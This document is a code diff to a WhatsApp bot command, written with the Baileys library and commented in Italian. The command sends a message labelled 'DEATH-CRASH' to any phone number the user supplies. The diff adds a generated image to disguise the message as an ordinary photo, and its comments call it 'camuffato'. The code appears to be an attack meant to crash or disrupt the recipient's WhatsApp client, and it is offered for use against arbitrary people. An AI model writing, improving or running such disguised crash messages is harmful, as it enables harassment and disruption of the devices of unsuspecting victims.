@@ -1,19 +1,38 @@
+import { createCanvas } from 'canvas'
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys'
 
-let handler = async (m, { conn, args, text, command }) => {
+let handler = async (m, { conn, text, command }) => {
   if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)
 
-  // costruisci il jid del target
   let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`
 
   try {
+    // genera immagine camuffo
+    const width = 800
+    const height = 600
+    const canvas = createCanvas(width, height)
+    const ctx = canvas.getContext('2d')
+
+    // sfondo nero
+    ctx.fillStyle = '#000'
+    ctx.fillRect(0, 0, width, height)
+
+    // scritta rossa
+    ctx.fillStyle = '#ff0000'
+    ctx.font = 'bold 60px Arial'
+    ctx.textAlign = 'center'
+    ctx.fillText('MATTE DOMINA', width / 2, height / 2)
+
+    const buffer = canvas.toBuffer()
+
+    // messaggio camuffato
     let msg = await generateWAMessageFromContent(target, {
       viewOnceMessage: {
         message: {
           interactiveMessage: {
             header: {
-              title: "𝐃𝐄𝐀𝐓𝐇-𝐃𝐎𝐌𝐈𝐍𝐀 ۞",
-              hasMediaAttachment: false
+              hasMediaAttachment: true,
+              imageMessage: (await conn.prepareMessage(target, { image: buffer }, { upload: conn.waUploadToServer })).message.imageMessage
             },
             body: {
               text: "𝐃𝐄𝐀𝐓𝐇-𝐂𝐑𝐀𝐒𝐇"
@@ -41,8 +60,7 @@ let handler = async (m, { conn, args, text, command }) => {
       participant: { jid: target }
     })
 
-    m.reply(`✅ Inviato a ${text}`)
-
+    m.reply(`✅ Foto camuffata inviata a ${text}`)
   } catch (e) {
     console.error(e)
     m.reply("❌ Errore durante l'invio")
